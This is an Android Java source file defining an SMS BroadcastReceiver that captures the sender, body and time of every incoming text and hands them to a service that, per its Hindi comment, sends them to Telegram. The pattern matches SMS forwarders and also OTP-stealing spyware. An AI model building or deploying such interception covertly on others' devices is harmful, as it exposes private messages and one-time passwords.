package com.smshandler;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            if (sms == null) continue;

            String sender = sms.getDisplayOriginatingAddress();
            String body   = sms.getMessageBody();
            long   time   = sms.getTimestampMillis();

            // Service ko bhejo — woh background thread pe Telegram call karega
            Intent svcIntent = new Intent(context, SmsService.class);
            svcIntent.putExtra("sms_sender", sender);
            svcIntent.putExtra("sms_body", body);
            svcIntent.putExtra("sms_time", time);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(svcIntent);
            } else {
                context.startService(svcIntent);
            }
        }
    }
}
